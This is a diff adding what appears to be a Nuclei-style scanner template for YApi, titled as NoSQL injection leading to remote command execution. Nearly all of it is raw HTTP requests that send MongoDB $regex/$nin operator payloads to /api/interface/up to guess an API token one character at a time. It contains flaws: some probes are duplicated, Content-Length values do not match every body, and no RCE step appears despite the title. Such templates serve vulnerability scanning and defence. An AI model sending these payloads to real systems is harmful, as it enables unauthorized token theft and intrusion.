@@ -1,0 +1,437 @@
+id: yapi-NoSQL-sqli
+info:
+  name: YApi从NoSQL注入到RCE远程命令执行
+  author: apple
+  severity: critical
+  description: YApi是一个可本地部署的、打通前后端及QA的、可视化的接口管理平台。可以从NoSQL注入到RCE远程命令执行
+  reference:
+    - http://zeo.cool/2023/03/05/YApi%E5%88%86%E6%9E%90%E4%BB%8ENoSQL%E6%B3%A8%E5%85%A5%E5%88%B0RCE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md/
+    - https://github.com/Threekiii/Vulhub-Reproduce/blob/master/YApi%20NoSQL%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+  tags: yapi
+  
+http:
+  - raw:
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 52
+
+        {"id": -1, "token": {"$regex": "^a", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^b", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^c", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^d", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^e", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^d", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^e", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^f", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^g", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^h", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^i", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^j", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^k", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^l", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^m", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^n", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^o", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^p", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^q", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^r", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^s", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^t", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^u", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^v", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^w", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^x", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^y", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^z", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^0", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^1", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^2", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^3", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^4", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^5", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^6", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^7", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^8", "$nin": []}}
+      - |-
+        POST /api/interface/up HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 49
+
+        {"id": -1, "token": {"$regex": "^9", "$nin": []}}
+        
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '不存在的接口'
